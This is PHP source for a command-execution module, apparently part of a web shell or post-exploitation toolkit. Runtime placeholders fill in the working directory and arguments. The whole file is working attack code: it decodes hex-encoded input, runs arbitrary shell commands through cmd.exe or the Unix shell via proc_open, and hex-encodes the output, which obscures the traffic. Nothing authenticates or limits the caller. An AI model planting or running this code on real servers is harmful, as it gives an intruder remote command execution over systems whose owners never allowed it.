#<?php


class Module_execute
{
    private $SUCC_CODE              = 0;
    private $ERR_CODE               = 1;

    private $FIELD_SEPARATOR        = ",";
    private $VALUE_SEPARATOR        = "=";

    private $DEFAULT_EMPTY_EXECUTOR = "-";
    private $DEFAULT_WIN_EXECUTOR   = "cmd.exe";

    private $RESPONSE_STATUS        = "status";
    private $RESPONSE_MESSAGE       = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function getOS()
    {
        $os = php_uname();
        if (substr($os, 0, 7) === "Windows")
            return "Windows";
        if (substr($os, 0, 5) === "Linux")
            return "Unix";
        return $os;
    }

    private function startsWith($haystack, $needle)
    {
        $length = strlen($needle);
        return substr($haystack, 0, $length) === $needle;
    }

    private function endsWith($haystack, $needle)
    {
        $length = strlen( $needle );
        if(!$length)
            return true;
        return substr($haystack, -$length) === $needle;
    }

    private function cleanQuotes($str)
    {
        if ($this->startsWith($str, '"') && $this->endsWith($str, '"'))
            return substr($str, 1, -1);
        return $str;
    }

    private function doExecute($executor, $commands)
    {
        $output = "";
        $command = "";
        $other_options = null;

        $os_name = $this->getOS();
        switch ($os_name)
        {
            case 'Windows':
                if ($executor === $this->DEFAULT_EMPTY_EXECUTOR)
                {
                    $command .= $this->DEFAULT_WIN_EXECUTOR . " /c " . implode(" ", $commands);
                }
                else
                {
                    $command .= $executor . " " . $this->cleanQuotes(implode(" ", $commands));
                    $other_options = array('bypass_shell' => true);
                }
                break;
            case 'Unix':
                if ($executor === $this->DEFAULT_EMPTY_EXECUTOR)
                {
                    $command .= $this->cleanQuotes(implode(" ", $commands));
                }
                else
                {
                    $command .= $executor . " " . $this->cleanQuotes(implode(" ", $commands));
                }
                break;
            default:
                throw new Exception("Insupported platform: '" . $os_name . "'");
        }

        $fds = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $cwd = getcwd();
         
        $process = proc_open($command, $fds, $pipes, $cwd, null, $other_options);
         
        if (is_resource($process) === false)
            throw new Exception("proc_open() failed");

        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $return_value = proc_close($process);
    
        if ($return_value !== 0)
            $this->return_code = $this->ERR_CODE;

        if (strlen($stdout) > 0 && strlen($stderr) === 0)
            $output = $stdout;
        elseif (strlen($stderr) > 0 && strlen($stdout) === 0)
            $output = $stderr;
        elseif (strlen($stdout) > 0 && strlen($stderr) > 0)
            $output = $stdout . PHP_EOL . $stderr;                

        return utf8_encode($output);
    }

    public function execute($args)
    {
        $result = "";
        $parsed_args = $this->parseArgs(hex2bin($args));
        $executor = "";
        $commands = array();
        
        try
        {
            if (sizeof($parsed_args) < 1)
                throw new Exception("Invalid arguments provided. Specify one or multiple commands");

            $executor = $parsed_args[0];
            $commands = $parsed_args;
            array_shift($commands);

            $result = $this->doExecute($executor, $commands);
        }
        catch (Exception $e)
        {
            $result = $e->getMessage();
            $this->return_code = $this->ERR_CODE;
        }

        return $this->generateResponse($result);
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_execute($cwd);
print($module->execute($args));